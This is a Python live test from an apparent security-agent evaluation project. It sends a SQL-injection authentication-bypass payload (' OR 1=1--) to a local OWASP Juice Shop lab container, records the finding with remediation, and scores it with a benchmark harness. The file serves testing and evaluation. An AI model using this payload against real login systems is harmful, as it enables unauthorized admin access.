"""A real live-target run: fire at an actual running Juice Shop container, record
what was found with the real record_finding tool, and score it with the eval
harness.

Requires Juice Shop's vulnerable instance already running locally, e.g.:
    docker compose -f docker-compose.juiceshop.yml up -d

Marked ``live`` (this project's existing pytest marker convention, see
pyproject.toml) and skipped when nothing answers at the expected port -
matching test_eval_live_vampi.py's exact same convention (itself matching
test_runtime.py's own established ``skipif(not docker_available(), ...)``
pattern), rather than relying solely on a marker to be excluded from a
default run. Its own standing discipline is that a lab-target container is
brought up only for a live run and torn down immediately after, never left
running between sessions.

Mirrors test_eval_live_vampi.py's own scope exactly: this fires one
hand-picked, verified-live request and calls record_finding directly, not a
full autonomous AgentLoop run - see that file's own docstring for why an
end-to-end LLM-driven live run is a separate, dedicated test
(test_eval_live_vampi_agent.py's own pattern).

The vulnerability exercised is Juice Shop's own well-documented SQL-injection
authentication bypass: submitting a SQL-comment payload as the login email
(``' OR 1=1--``) with any password returns a valid admin JWT with no
credential knowledge required at all - confirmed against a real running
instance of this exact image before writing this test, not assumed from
Juice Shop's own documentation.
"""

from __future__ import annotations

import socket

import httpx
import pytest

from lalo.agent.tools import ToolRegistry
from lalo.eval.cases import BenchmarkCase, run_case
from lalo.eval.scoring import score_composite
from lalo.execution.firer import HttpFirer
from lalo.execution.scope import ScopeGuard
from lalo.execution.target import Engagement
from lalo.findings.tool import build_record_finding_tool
from lalo.graph.model import ReachabilityGraph

JUICE_SHOP_HOST = "127.0.0.1"
JUICE_SHOP_PORT = 3000
JUICE_SHOP_URL = f"http://{JUICE_SHOP_HOST}:{JUICE_SHOP_PORT}"


def _juice_shop_reachable() -> bool:
    try:
        with socket.create_connection((JUICE_SHOP_HOST, JUICE_SHOP_PORT), timeout=0.5):
            return True
    except OSError:
        return False


_SQLI_CVSS = {
    "attack_vector": "N",
    "attack_complexity": "L",
    "privileges_required": "N",
    "user_interaction": "N",
    "scope": "U",
    "confidentiality": "H",
    "integrity": "H",
    "availability": "N",
}


@pytest.mark.live
@pytest.mark.skipif(
    not _juice_shop_reachable(), reason="Juice Shop is not running on 127.0.0.1:3000"
)
def test_live_juice_shop_sqli_login_bypass_scores_as_a_true_positive() -> None:
    engagement = Engagement.from_specs(["127.0.0.1:3000"])
    scope = ScopeGuard(engagement=engagement)
    firer = HttpFirer(scope, client=httpx.Client())

    result = firer.fire(
        "POST",
        f"{JUICE_SHOP_URL}/rest/user/login",
        headers={"Content-Type": "application/json"},
        content=b'{"email": "\' OR 1=1--", "password": "x"}',
    )
    assert result.fired is True
    assert result.status == 200
    body = result.body.decode("utf-8")
    # The admin account's own real email, returned with no credential
    # knowledge - the actual proof of the bypass, not just a 200 status.
    assert "admin@juice-sh.op" in body

    graph = ReachabilityGraph()
    registry = ToolRegistry([build_record_finding_tool(graph)])
    record_result = registry.dispatch(
        "record_finding",
        {
            "title": "SQL injection authentication bypass via /rest/user/login",
            "description": (
                'Submitting "\' OR 1=1--" as the login email with any password '
                "returns a valid JWT for the first account in the users table "
                "(the admin account) - the login query concatenates the email "
                "field directly into a SQL WHERE clause."
            ),
            "vuln_class": "sql-injection",
            "target": f"{JUICE_SHOP_URL}/rest/user/login",
            "evidence": [body],
            "evidence_excerpt": "admin@juice-sh.op",
            "counterevidence": "No password matching the admin account was ever supplied.",
            "severity_change_conditions": (
                "Confirming write access via the returned admin token would raise severity."
            ),
            "remediation": "Use parameterized queries for the login lookup.",
            "cvss_breakdown": _SQLI_CVSS,
        },
    )
    assert record_result.ok is True

    case = BenchmarkCase(
        name="juice-shop-live-smoke",
        description="A narrow live smoke case: one known Juice Shop primitive, not the target.",
        ground_truth_classes=frozenset({"sql-injection"}),
    )
    case_result = run_case(case, graph)
    assert case_result.found_classes == frozenset({"sql-injection"})

    composite = score_composite([case_result])
    assert composite.mean_recall == 1.0
    assert composite.mean_precision == 1.0
    assert composite.case_count == 1
